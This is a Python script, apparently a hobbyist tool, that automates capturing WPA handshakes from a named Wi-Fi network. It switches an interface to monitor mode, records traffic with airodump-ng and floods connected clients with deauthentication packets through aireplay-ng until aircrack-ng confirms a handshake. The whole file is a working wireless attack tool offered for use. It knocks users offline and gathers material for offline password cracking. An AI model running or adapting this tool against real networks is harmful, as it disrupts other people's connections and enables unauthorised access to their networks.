#!/usr/bin/ python3
# 0.1.0

import argparse							# parse flags
import os								# check for directories, open processes
import subprocess						# open processes
import time								# sleep and timers
import difflib							# for network guesses
from datetime import datetime as dt		# output time
from termcolor import colored			# some colors for ya


# Parsing values ------------------ Start
parser = argparse.ArgumentParser(description="Automatically capture handshake")
parser.add_argument("ssid", metavar="NETWORK", help="Network name.")

parser.add_argument("-i", metavar="INTERFACE", default="", help="Interface.")
parser.add_argument("-c", metavar="CONFIDENCE", type=float, default=0.6, help="Confidence in guessing network name from 0 to 1 (default = 0.6).")
parser.add_argument("-p", metavar="PACKETS", type=int, default=10, help="Amount of packets to send (default = 10)")
parser.add_argument("-d", metavar="DIRECTORY", default="", help="Directory, in which .cap file is stored (default = mydirectory/wifis/NETWORK/)")

parser.add_argument("--nokill", default=False, action="store_true", help="Won't kill NetworkManager. May not work depending upon your software/firmware.")
parser.add_argument("--nolog", default=False, action="store_true", help="Won't print anything to console. (Why?)")
parser.add_argument("--noclear", default=False, action="store_true", help="Won't clear files generated by airmong-ng.")

args = parser.parse_args()
# Parsed values ------------------- End


# Parsed variables ------------------------- Start
Interface = args.i
SSID = args.ssid
Confidence = args.c	# How confident script must be in guessing network name
DeauthPacketsAmount = args.p
Directory = "{}/wifis/".format(os.popen("pwd").read()[:-1]) if args.d == "" else args.d

KillProcesses = not args.nokill
DoLog = not args.nolog
DoClear = not args.noclear
# Parsed variables ------------------------- End


# Custom functions ------------------------- Start
def log(logstring, logtype = 0, bold = False, rewriteable = False):
	if not DoLog:
		return

	type_indicator = ""
	if logtype == 0:
		type_indicator = colored("INFO", "green", attrs=['bold']) if bold else colored("INFO", "green")
	if logtype == 1:
		type_indicator = colored("WARNING", "yellow", attrs=['bold']) if bold else colored("WARNING", "yellow")
	if logtype == 2:
		type_indicator = colored("ERROR", "red", attrs=['bold']) if bold else colored("ERROR", "red")
	
	if rewriteable:
		print("[" + colored(str(dt.now().time()).split(".")[0], "blue") + "] [" + type_indicator + "] " + logstring, end="\r")
	else:
		print("[" + colored(str(dt.now().time()).split(".")[0], "blue") + "] [" + type_indicator + "] " + logstring)


def run_command(command):
	return os.popen(command).read()


def run_command_background(command):
	return os.popen(command)


# As a wise man once said: That night only God and me knew what I was writing. Now only God knows.
def select_interface(interface_name):
	Interfaces = []
	InterfaceIndex = type(int)

	interfaces = run_command("sudo iwconfig 2>&1 | grep -oP '^\w+'").split("\n")[:-1]
	if len(interfaces) < 3:
		log("No interfaces.", 2)
		exit()
	
	index = 0
	for interface in interfaces:
		if interface != "lo" and interface != "eth0":
			run_command("sudo ifconfig {} up".format(interface))
			#time.sleep(2)	#WHY?
			Interfaces.append(interface)
			index += 1
	if Interface != "":
		if interface_name in Interfaces:
			return interface_name
		else:
			log("No such interface {}".format(interface_name), 2)
			exit()

	if len(Interfaces) > 1:
		while interface_name == "":
			print("Choose interface: ")
			i = 0
			chosen = ""
			for interface in Interfaces:
				print(interface + " ({})".format(i))
				i += 1
			InterfaceIndex = int(input())
			if len(Interfaces) > InterfaceIndex:
				return Interfaces[InterfaceIndex]
			else:
				log("You picked the wrong house fool.", 1)
	else:
		InterfaceIndex = 0
		return Interfaces[0]


def get_name_by_phy(interface_phy):
	return run_command("sudo airmon-ng | egrep {} |".format(interface_phy) + " awk '{print $2}'")[:-1]


def get_phy_by_name(interface_name):
	return run_command("sudo airmon-ng | egrep {} |".format(interface_name) + " awk '{print $1}'")[:-1]


def get_monitor_mode(interface_name):
	command_get_mode = "sudo iwconfig {} | awk -F: '/Mode/{{print$2}}'".format(interface_name)
	output_get_mode = run_command(command_get_mode).split(" ", 1)[0]
	if output_get_mode == "Monitor":
		return True
	else:
		return False


def start_network_manager():
	if "Unit dhcpcd.service" in os.popen("sudo systemctl start dhcpcd 2>&1").read():
		run_command("sudo systemctl start NetworkManager")


def start_airmon(interface_name, kill):
	if kill:
		run_command("sudo airmon-ng check kill")
	
	interface_phy = get_phy_by_name(interface_name)
	run_command("sudo airmon-ng start {}".format(interface_name))
	interface_new = get_name_by_phy(interface_phy)
	
	log("Changed interface: {}".format(interface_new))
	return interface_new


def stop_airmon(interface_name):
	interface_phy = get_phy_by_name(interface_name)
	run_command("sudo airmon-ng stop '{}'".format(interface_name))
	interface_new = get_name_by_phy(interface_phy)
	
	log("Changed interface: {}".format(interface_new))
	return interface_new


# ooooh noooooooo
def get_network_info(interface_name, network_name, guessing_confidence):
	BSSID = ""
	Channel = ""
	output_scan_wifi = run_command("""sudo iwlist {} scan | egrep 'ESSID:|Address:|Channel:' | cut -d : -f 2,3,4,5,6,7,8 | tr -d '"' | sed 's/ //g' 2>&1""".format(interface_name))
		
	splited_output_scan_wifi = output_scan_wifi.split("\n")
	#if not splited_output_scan_wifi:
	#	time.sleep(5)
	#	output_scan_wifi = os.popen(command_scan_wifi).read()
	#	splited_output_scan_wifi = output_scan_wifi.split("\n")

	del splited_output_scan_wifi[len(splited_output_scan_wifi)-1]

	if not splited_output_scan_wifi:
		log("No networks found. If you see 'Device or resource busy' or 'Resource temporarily unavailable' error above, disconnecting any network and closing NetworkManager window might help.", 2)
		exit()

	wifiNames = []

	index = 1
	for record in splited_output_scan_wifi:
		if record == network_name:
			BSSID = splited_output_scan_wifi[splited_output_scan_wifi.index(network_name)-2]
			Channel = int(splited_output_scan_wifi[splited_output_scan_wifi.index(network_name)-1])
			return [network_name, BSSID, Channel]

		elif index == 3:
			wifiNames.append(record)
			index = 0
		index += 1

	try:
		closeMatch = difflib.get_close_matches(network_name, wifiNames, 1, Confidence)[0]
		closeMatchScore = str(difflib.SequenceMatcher(None, network_name, closeMatch).ratio())
		
		BSSID = splited_output_scan_wifi[splited_output_scan_wifi.index(closeMatch)-2]
		Channel = int(splited_output_scan_wifi[splited_output_scan_wifi.index(closeMatch)-1])
		
		log("No such network '{}', assuming you typed '{}'. (confidense: {})".format(network_name, closeMatch, closeMatchScore), 1)
		return [closeMatch, BSSID, Channel]
	except IndexError:
		log("Error scanning for network (network name is incorrect).", 2)
		exit()


def start_airodump(interface_name, BSSID, channel, directory):
	command_airodump = "sudo airodump-ng --bssid '{}' -c '{}' --write-interval 1 --write '{}' {} > /dev/null 2>&1".format(BSSID, channel, directory, interface_name)
	return subprocess.Popen(command_airodump, shell=True)


def fill_stations_from_csv(directory):
	stations = []
	with open("{}-01.csv".format(directory), 'r') as csvfile:
		for index, value in enumerate(csvfile):
			if index > 4:
				value = value.split(',')[0]
				if value != "\n" and value != "\r\n":
					stations.append(value)
	return stations


def select_station(stations, current_station_address):
	if current_station_address == "":
		return stations[0]
	else:
		new_station_address = stations[stations.index(current_station_address)+1]
		del stations[stations.index(current_station_address)]
		return new_station_address


def deauthNetwork(interface_name, BSSID, station, deauth_packets):
	command_aireplay = "sudo aireplay-ng --ignore-negative-one --deauth {} -a {} -c {} {} > /dev/null 2>&1".format(deauth_packets, BSSID, station, interface_name)
	return subprocess.Popen(command_aireplay, shell=True).wait()


# dark magic, I dont have courage to reafactor this.
def make_directory(directory, network_name):
	directory_path = directory
	directory_path += "{}/".format(network_name)
	if os.path.isdir(directory_path):
		if len(os.listdir(directory_path)) > 0:
			index = 1
			while os.path.isdir(directory_path):
				if index >= 2:
					directory_path = directory_path[:-1]
				directory_path = directory_path[:-1]
				directory_path += str(index) + '/'
				index += 1
			os.makedirs(directory_path)
	else:
		os.makedirs(directory_path)
	return directory_path


def check_handshake(directory):
	command_test_corupted = "aircrack-ng {}01.cap 2>&1 | egrep 'corrupted file' | tr -d '('".format(directory)
	command_get_handshakes = "aircrack-ng {}01.cap 2>&1 | egrep handshake".format(directory) + " | awk '{print $5;}' | tr -d '(\n'"
	
	if(run_command(command_test_corupted) != ""):
		return False, "Corrupted file"
	
	if(run_command(command_get_handshakes) == "0"):
		return False, "No handshake"
	
	return True, "Success"


def check_for_stations(directory):
	startTime = time.time()
	index = 1
	while True:
		if index != 1:
			# check output
			stations = fill_stations_from_csv(directory)
			if len(stations) > 0:
				current_station_address = select_station(stations, "")
				log("Stations: {}".format(stations))
				return stations, current_station_address
		index += 1
		time.sleep(3.0 - ((time.time() - startTime) % 3.0))


def manage_temporary_files(directory, clean):
	if not clean:
			os.makedirs(directory + "stations/")
	for _file in os.listdir(directory):
		if os.path.splitext(_file)[1] == ".csv" or os.path.splitext(_file)[1] == ".netxml":
			path = os.path.join(directory, _file)
			if not clean:
				os.rename(path, os.path.join(directory + "stations/", _file))
			else:
				os.remove(path)
# Custom functions ------------------------- End


# MAIN ---------------------------------- Start
def recieveHandshake(interface_name, network_name, directory, guessing_confidence = 0.6, deauth_packets = 10, kill_wifi = True):
	if get_monitor_mode(interface_name):
		interface_name = stop_airmon(interface_name)
		if kill_wifi:
			start_network_manager()
			time.sleep(5)
	NetworkName, BSSID, Channel = get_network_info(interface_name, network_name, guessing_confidence)
	log("[SSID: {}] [BSSID: {}] [Channel: {}]".format(NetworkName, BSSID, Channel))
	Directory = make_directory(directory, NetworkName)
	log("Directory: {}.".format(Directory))
	interface_name = start_airmon(interface_name, kill_wifi)
	start_airodump(interface_name, BSSID, Channel, Directory)
	log("Waiting for a station to appear.")
	Stations, CurrentStation = check_for_stations(Directory)
	log("Sending {} deauth packets to: {}.".format(deauth_packets, CurrentStation))
	deauthNetwork(interface_name, BSSID, CurrentStation, deauth_packets)
	
	#and then dark magic begins
	cyclesCount = 0
	while check_handshake(Directory)[0] is False:
		if check_handshake(Directory)[1] == "Corrupted file":
			log("Capture file is currupted. Please restart the script.", 2)
			interface_name = stop_airmon(interface_name)
			if kill_wifi:
				start_network_manager()
			exit()
		log("Handshake not found, repeating.", 1)
		if len(Stations) > 0 and cyclesCount < len(Stations):
			CurrentStation = select_station(Stations, CurrentStation)
			log("Selecting another station: {}.".format(CurrentStation))
			log("Sending {} deauth packets to: {}.".format(deauth_packets, CurrentStation))
			deauthNetwork(interface_name, BSSID, CurrentStation, deauth_packets)
			cyclesCount += 1
		else:
			log("Rescanning stations.")
			Stations, CurrentStation = check_for_stations(Directory)
			log("Sending {} deauth packets to: {}.".format(deauth_packets, CurrentStation))
			deauthNetwork(interface_name, BSSID, CurrentStation, deauth_packets)
			cyclesCount = 1
	log("Success!", 0, True)
	manage_temporary_files(Directory, DoClear)
	interface_name = stop_airmon(interface_name)
	if kill_wifi:
		start_network_manager()
	return Directory

if __name__ == "__main__":
	Interface = select_interface(Interface)
	log("Interface: {}.".format(Interface))
	recieveHandshake(Interface, SSID, Directory, Confidence, DeauthPacketsAmount, KillProcesses)
# MAIN ---------------------------------- END
